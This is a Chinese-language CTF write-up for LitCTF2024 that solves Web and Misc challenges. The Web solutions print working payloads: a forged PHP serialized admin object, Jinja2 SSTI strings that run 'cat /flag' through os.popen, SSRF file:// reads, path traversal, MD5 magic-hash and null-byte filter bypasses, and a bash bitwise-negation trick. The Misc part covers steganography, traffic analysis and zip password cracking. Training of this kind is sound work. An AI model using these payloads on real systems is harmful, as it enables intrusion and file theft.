---
title: LitCTF2024
date: 2024-06-01 06:09:21
updated: 2025-10-11 09:25:21
tags:
  - WriteUp
  - CTF
---
# Web

## SAS - Serializing Authentication System(BigColaXD)

![image.png](https://cdn.nlark.com/yuque/0/2024/png/39170111/1717224544885-c075896a-e5ac-4a8d-b6f7-734280e8cff2.png)简单的php反序列化

```php
<?php

class User {

    public $username='admin';

    public $password='secure_password';

    }

$a=serialize(new User());
echo base64_encode($a);
//Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjE1OiJzZWN1cmVfcGFzc3dvcmQiO30=
?>
```

提交base64加密后的序列化字符串，拿到flag

![image.png](https://cdn.nlark.com/yuque/0/2024/png/39170111/1717224625708-25a213a9-12be-461a-9561-97a76dff866e.png)

## exx(BigColaXD)

XML 外部实体注入，有原题和这个几乎一样

![image.png](https://cdn.nlark.com/yuque/0/2024/png/39170111/1717224870440-fe732e00-1a68-4fa3-b7a5-47d011f9ad0f.png)

burp抓包，改包

![image.png](https://cdn.nlark.com/yuque/0/2024/png/39170111/1717224941403-80c81949-162e-48a4-972b-7d91cc339750.png)

拿到flag

## 一个....池子？(BigColaXD)

![image.png](https://cdn.nlark.com/yuque/0/2024/png/39170111/1717225096357-a345edfa-5022-4eaf-bd43-c620c12c7e3a.png)

先随便输入点东西提交，回显和输入的一样，怀疑ssti

![image.png](https://cdn.nlark.com/yuque/0/2024/png/39170111/1717225141659-8843e904-a386-4c85-b137-98988004c055.png)

![image.png](https://cdn.nlark.com/yuque/0/2024/png/39170111/1717225147788-c92712f0-323b-476a-9a05-59c9d7e25800.png)

确实是ssti

用lipsum.\_\_globals\_\_的os模块命令执行

```python
{{lipsum.__globals__['os'].popen("ls /").read()}}
```

![image.png](https://cdn.nlark.com/yuque/0/2024/png/39170111/1717225322857-d3fbe4fb-c162-4bf5-a403-f6f7a30ac7ee.png)

找到flag在根目录下

cat /flag

```python
{{lipsum.__globals__['os'].popen("cat /flag").read()}}
```

![image.png](https://cdn.nlark.com/yuque/0/2024/png/39170111/1717225341361-97ee64be-761e-4c11-a4a6-555a9dfc304b.png)

## 浏览器也能套娃？(BigColaXD)

先尝试http://baidu.com

![image.png](https://cdn.nlark.com/yuque/0/2024/png/39170111/1717226305924-73563595-3c9a-4e8b-b4a6-01cff5d2842d.png)

发现能回显url内容

存在ssrf，可以使用file://协议读取文件内容

file:///flag

尝试读取根目录下的flag

![image.png](https://cdn.nlark.com/yuque/0/2024/png/39170111/1717226520256-f138d903-399b-42d5-bd93-178427b6b437.png)

## 高亮主题(划掉)背景查看器(BigColaXD)

![image.png](https://cdn.nlark.com/yuque/0/2024/png/39170111/1717225454232-62eeee07-aa4b-47d1-833b-c9588176ce69.png)

点击Use this theme，抓包

![image.png](https://cdn.nlark.com/yuque/0/2024/png/39170111/1717225559419-98eb7b14-4bbb-4139-8d0c-f828ccdaa3d3.png)

看到post的参数theme=theme1.php，回显了theme1.php的内容

利用目录遍历读取根目录下的flag

**theme=../../../../flag**

![image.png](https://cdn.nlark.com/yuque/0/2024/png/39170111/1717225917634-d132c594-c410-4ecf-924a-94b8fb28c3d8.png)

## 百万美元的诱惑(BigColaXD)

![image.png](https://cdn.nlark.com/yuque/0/2024/png/39170111/1717226550884-5cfa45e2-9805-4a4d-be07-e0a532e0e89a.png)

绕md5  
a=QNKCDZO&b=PJNPDWY

%00绕is\_numeric函数

c=10000%00

![image.png](https://cdn.nlark.com/yuque/0/2024/png/39170111/1717226729660-d593b48f-f758-48f8-acbf-8e210cb3f04d.png)

得到./dollar.php

![image.png](https://cdn.nlark.com/yuque/0/2024/png/39170111/1717226986052-239ad751-9db5-4130-9d76-32d8b772333e.png)提示flag在12.php，因此要传入x=12。

过滤了字母和数字，根据这个和题目猜测要用到$取反

![image.png](https://cdn.nlark.com/yuque/0/2024/png/39170111/1717227296710-b9467653-92bb-4eb6-833a-24aac6ffd04a.png)传参：  
x=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))

![image.png](https://cdn.nlark.com/yuque/0/2024/png/39170111/1717226939755-3c877632-5ffc-4875-b682-6d98f68806f9.png)拿到flag

# Misc

## 涐贪恋和伱、甾―⑺dé毎兮毎秒(BigColaXD)

根据题目提示laosebi，猜测LSB隐写

![image.png](https://cdn.nlark.com/yuque/0/2024/png/39170111/1717236752838-fd5333a0-6044-4bd4-ab42-f2b6df35cb1d.png)

## 原铁，启动！(BigColaXD)

根据题目提示猜测为原神和崩铁的文字

![image.png](https://cdn.nlark.com/yuque/0/2024/png/39170111/1717227952918-11ddeea6-bfa3-42cc-a29f-d55fdc4b8fe3.png)

根据题目提示通用文字，得到![image.png](https://cdn.nlark.com/yuque/0/2024/png/39170111/1717228002023-ed2a805c-38a8-4046-98b8-f997413f3771.png)，为FLAG{GOOD\_

![](https://cdn.nlark.com/yuque/0/2024/jpeg/39170111/1717227767968-86beef12-528f-4340-8e39-53f408a65bcf.jpeg)

后半段对照崩铁通用文![image.png](https://cdn.nlark.com/yuque/0/2024/png/39170111/1717228059168-1729a715-ad06-4604-a7e0-e6f6008b9f58.png)，为GAMER}

![image.png](https://cdn.nlark.com/yuque/0/2024/png/39170111/1717227871040-356dd6db-c1ba-4cc3-8e14-e71acca6fcfa.png)

最后2段结合得到FLAG{GOOD\_GAMER}

提交LitCTF{good\_gamer}

## 舔到最后应有尽有(BigColaXD)

![image.png](https://cdn.nlark.com/yuque/0/2024/png/39170111/1717228552546-e0b3d3ee-167f-4525-a255-9d494f2125ee.png)

猜测base64隐写

![image.png](https://cdn.nlark.com/yuque/0/2024/png/39170111/1717228651065-f73097f0-1cd5-4dfe-843b-ca92685929de.png)

## 关键，太关键了!(BigColaXD)

打开附件拿到密文和处理过的密钥

![image.png](https://cdn.nlark.com/yuque/0/2024/png/39170111/1717228767460-fcdca319-b79a-44eb-b760-1ef3845ff7bb.png)

统计key.txt中字符出现的频率

![image.png](https://cdn.nlark.com/yuque/0/2024/png/39170111/1717228910195-17ceaf63-c1f0-4f2d-aabc-10c17e8a6914.png)

猜测密钥为bingo

![image.png](https://cdn.nlark.com/yuque/0/2024/png/39170111/1717229611109-846089c6-2291-4f35-8a5b-d65b8ac58817.png)

得到flag

## 女装照流量

先看一遍http协议的流量包

发现有敏感字符串“flag”，binwalk分离出来

![bw.jpg](https://cdn.nlark.com/yuque/0/2024/jpeg/39170111/1717241339708-0fcaa0e7-222b-4a29-9fdb-7399193e455e.jpeg)

但是压缩包需要密码，回去接着看

流25发现响应包有目录回显

![11.jpg](https://cdn.nlark.com/yuque/0/2024/jpeg/39170111/1717241199472-06041f3e-d710-4974-bfd6-07da195d59dd.jpeg)

流27发现回显的目录中多了f1ag.zip

![3.jpg](https://cdn.nlark.com/yuque/0/2024/jpeg/39170111/1717241423878-9788144c-d00a-4564-bb3c-bd78459ef179.jpeg)

则怀疑流26中生成了压缩文件

![4.jpg](https://cdn.nlark.com/yuque/0/2024/jpeg/39170111/1717241503681-31338005-edf3-4325-afa2-3d155084f70f.jpeg)

将这个流量包的php代码导出，url解码后格式化

![5.jpg](https://cdn.nlark.com/yuque/0/2024/jpeg/39170111/1717241514650-794aa520-b2ce-4775-b090-b4d3e4eec910.jpeg)

发现代码对post的参数进行了处理

接着将post的内容按照他的方式执行

![6.jpg](https://cdn.nlark.com/yuque/0/2024/jpeg/39170111/1717241518916-89ff5dc3-4272-4e11-a95b-d694b1937365.jpeg)

得到密码后打开压缩包拿到flag

![flag.jpg](https://cdn.nlark.com/yuque/0/2024/jpeg/39170111/1717241744634-5415270f-d4a3-4ccf-bd14-f2ecc643003e.jpeg)

## The love

binwalk分离love.jpg，又一个带密码的压缩包，确认不是伪加密

检查音频文件没有找到什么东西

把love.jpg放到010搜索敏感字符串ctf

发现有匹配，怀疑掩码攻击

![2.jpg](https://cdn.nlark.com/yuque/0/2024/jpeg/39170111/1717243087498-43c167ff-4ce5-4aed-9057-e29d953708a3.jpeg)

放到ARCHPR爆破出来密码

Litctf202405ftctiL

打开压缩包中的文件，一个是假flag，一个是疑似base64编码的字符串

![image.png](https://cdn.nlark.com/yuque/0/2024/png/39170111/1717243217270-249fe7b0-84d5-45af-955d-f0a9e5a26c64.png)

解码得到一串字符，但并不是flag

剩下音频还没有处理

怀疑带密钥的音频隐写，放到deepsound，输入上一步得到的字符串

![image.png](https://cdn.nlark.com/yuque/0/2024/png/39170111/1717245661075-3984242d-d75f-4809-a2eb-35dababec0de.png)

![image.png](https://cdn.nlark.com/yuque/0/2024/png/39170111/1717245666054-16821b69-f4f8-4deb-8f70-ad9f872282cf.png)

得到flag